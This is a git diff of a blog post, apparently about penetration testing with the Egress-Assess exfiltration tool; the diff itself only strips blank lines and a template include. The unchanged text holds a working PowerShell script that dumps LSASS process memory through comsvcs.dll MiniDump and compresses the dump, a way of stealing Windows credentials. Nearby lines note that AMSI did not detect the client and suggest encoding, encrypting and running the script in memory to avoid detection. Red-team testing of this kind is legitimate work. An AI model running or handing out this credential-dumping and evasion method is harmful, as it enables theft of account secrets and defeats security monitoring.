@@ -14,13 +14,6 @@ Egress-Assess has many use cases for confirming if data can be extracted out of 
 Another great feature is that the client doesnt require local administrative privileges to run.
 During testing it was also noted that as from the time of testing amsi didnt detect the client software as malicous or blocked the traffic as suspicous.
 
-
-
-
-
-
-
-{% include codeHeader.html %}
 ```
 $processes = Get-Process
 $location = Get-Location
@@ -30,7 +23,6 @@ $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass")
 	rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $location\$env:COMPUTERNAME.bin full | Out-Null
 	Compress-Archive -Path $location\$env:COMPUTERNAME.bin -DestinationPath $location\$env:COMPUTERNAME.zip -CompressionLevel NoCompression
 ```
-
 
 We can also encode and encrypt the script to make it harder to be detected and run it straight in memory via Invoke Expression.
 
